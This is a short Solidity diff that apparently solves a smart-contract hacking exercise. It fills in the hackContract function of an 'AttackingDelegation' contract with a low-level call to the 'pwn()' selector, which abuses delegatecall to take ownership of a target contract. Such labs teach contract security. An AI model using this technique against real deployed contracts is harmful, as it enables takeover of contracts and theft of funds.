@@ -10,6 +10,10 @@ contract AttackingDelegation {
     }
 
     function hackContract() external {
-        // Code me!
+        (bool success, bytes memory returnData) = 
+        contractAddress.call(
+            abi.encodeWithSelector(bytes4(
+                    keccak256("pwn()"))));
+
     }
 }
